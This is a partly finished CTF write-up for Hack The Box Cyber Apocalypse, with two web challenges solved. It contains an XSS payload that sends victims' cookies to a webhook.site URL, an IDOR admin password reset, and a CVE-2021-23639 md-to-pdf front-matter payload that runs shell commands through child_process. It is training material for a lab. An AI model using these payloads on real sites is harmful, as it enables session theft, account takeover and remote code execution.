# Hack The Box - Cyber Apocalypse

A CTF Hosted by Hack The Box which lasted 5 days. I ranked 245th out of more than 7000 teams.

------------

- [Pwn](#pwn)
	-  [Space Pirate: Entrypoint](#pwn1 "Space Pirate: Entrypoint")
	-  [Space pirate: Going Deeper](#pwn2)
	-  [Space pirate: Retribution](#pwn3)
	-  [Vault-breaker](#pwn4)
	-  [Fleet Management](#pwn5)
	-  [Hellbound](#pwn6)
	-  [Trick or Deal](#pwn7)
- [Web](#web)
	-  [Kryptos Support](#web1)
	-  [BlinkerFluids](#web2)
	-  [Amidst Us](#web3)
	-  [Intergalactic Post](#web4)
	-  [Acnologia Portal](#web5)
	-  [Red Island](#web6)
	-  [Mutation Lab](#web7)
- [Rev](#rev)
	-  [WIDE](#rev1)
- [Misc](#misc)
	-  [Compressor](#misc1)

------------

### Pwn
1. <p name="pwn1">Space Pirate: Entrypoint (★☆☆☆)</p>

2. <p name="pwn2">Space Pirate: Going Deeper (★☆☆☆)</p>

3. <p name="pwn3">Space pirate: Retribution (★☆☆☆)</p>

4. <p name="pwn4">Vault-breaker (★☆☆☆)</p>

5. <p name="pwn5">Fleet Management (★☆☆☆)</p>

6. <p name="pwn6">Hellbound (★★☆☆)</p>

7. <p name="pwn7">Trick or Deal (★★☆☆)</p>


<br/>

### Web
1. <p name="web1">Kryptos Support (★☆☆☆)</p>
For this challenge we were given a website with a `/login` & `/signup` pages. Upon signing up, we get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/report_web1.png'>
</p>

So, this should be a basic XSS since we didn't even get a source code. Going for a basic payload:

```html
<script>
    fetch('https://webhook.site/a02af4ea-d61b-440d-9982-c3804fd1587a?q='+document.cookie);
</script>
```

Gives us the moderator's cookies! Having a look on them, we see a session cookie.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/session_web1.png'>
</p>

We add the session & we visit `/settings`. The magic happens & we are logged in. 

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/settings_web1.png'>
</p>

There is no flag yet? We apparently need to access something higher, maybe an admin account? So we try the change password functionality & we have a look on the HTTP Request. We see that we are sending the UID in the request body:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/request_web1.png'>
</p>

Trying to find the admin ID, we change the UID to 1 & send our HTTP Request. We get a confirmation from the server:

```json
{
    "message": "Password for admin changed successfully!"
}
```

We login as the admin now & we get our flag: 

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/flag_web1.png'>
</p>

<br/>

2. <p name="web2">BlinkerFluids (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/)). Looking into the website, we see an invoice list & an option to add a new invoice.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web2.png'>
</p>

If we try to create a new invoice, we get a nice default text that is formated with Markdown Language.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/new_invoice_web2.png'>
</p>

Now, let's dig into the source code. Starting with the [/routes/index.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/routes/index.js), we see that the creation of an invoice uses an MDHelper.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/routes_web2.png'>
</p>

We then head to our helper file, located at [/helpers/MDHelper.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/helpers/MDHelper.js)

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/helpers_web2.png'>
</p>

So, if we consider our possible attack vectors, our main target will be the `md-to-pdf` module. So this will be our start!

The first thing we get related to security issues for this module will be `CVE-2021-23639`. It involves a Remote Code Execution caused by the gray-matter's JS-engine, which is enabled by default. This was fixed in version 5.0.0 of `md-to-pdf` but if we check [/package.json](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/package.json), we see that we are using version `4.1.0` so we got our exploit :)

For a proof of concept & more information, you can refer to these links:
- [Link 1](https://github.com/simonhaenisch/md-to-pdf/issues/99)
- [Link 2](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880)

We have access to `/static` route which means, we can use it to write our command output there. Our final payload will be:

```
---js
((require("child_process")).execSync("cat /flag.txt > /app/static/flag"))
---
```

& we'll be able to access `/static/flag` route & get our flag: `HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`

<br/>

3. <p name="web3">Amidst Us (★☆☆☆)</p>

4. <p name="web4">Intergalactic Post (★☆☆☆)</p>

5. <p name="web5">Acnologia Portal (★★☆☆)</p>

6. <p name="web6">Red Island (★★☆☆)</p>

7. <p name="web7">Mutation Lab (★★☆☆)</p>

<br/>

### Rev
1. <p name="rev1">WIDE (★☆☆☆)</p>

<br/>

### Misc
1. <p name="misc1">Compressor (★☆☆☆)</p>


WIP